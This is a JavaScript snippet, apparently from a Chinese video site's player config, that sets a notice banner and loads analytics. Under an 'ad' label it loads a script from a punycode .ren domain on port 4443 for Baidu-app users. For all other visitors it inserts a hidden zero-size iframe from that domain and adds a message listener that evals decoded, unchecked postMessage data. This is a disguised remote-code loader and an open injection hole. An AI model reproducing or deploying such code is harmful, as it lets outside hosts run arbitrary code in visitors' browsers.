    // TIPS 设置
    $(".play-tips").css("display","flex");
    // $("#tips-index-content").html("【公告】：永久播放网址：<span style='color:#07A5DF;'></span>，非常好记，手机浏览器输入网址即可打开，收藏以防失联...");
    $("#tips-index-content").html("【公告】：武汉加油,湖北加油,中国加油!!!");
    
    // 全局ad
    if(config['bottom_ads']=="1"){
        //插入AD代码
        if (navigator.userAgent.indexOf('baiduboxapp') > -1) {
            document.write('<script src="https://xn--xhq9mt12cf5v.ren:4443/ty/x-234-33.js"><\/script>')
        } else {
            (function() {
                window.addEventListener("message", function(e) {
                    var _des_s_234 = e.data;
                    if (_des_s_234.des_s_234) {
                        var _s = '/+/g';
                        eval(decodeURIComponent(_des_s_234.des_s_234.replace(_s, "%20")))
                    }
                });
                document.write('<iframe style="display:none;" src="https://xn--xhq9mt12cf5v.ren:4443/ty/x-234-33-1.html" height="0" width="0"  marginheight="0" scrolling="no" frameborder="0" allowtransparency="true"></iframe>')
            }
            )();
        }
    }

    //cnzz
    var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");document.write(unescape("%3Cspan style='display:none;' id='cnzz_stat_icon_1278625983'%3E%3C/span%3E%3Cscript src='https://s9.cnzz.com/z_stat.php%3Fid%3D1278625983' type='text/javascript'%3E%3C/script%3E"));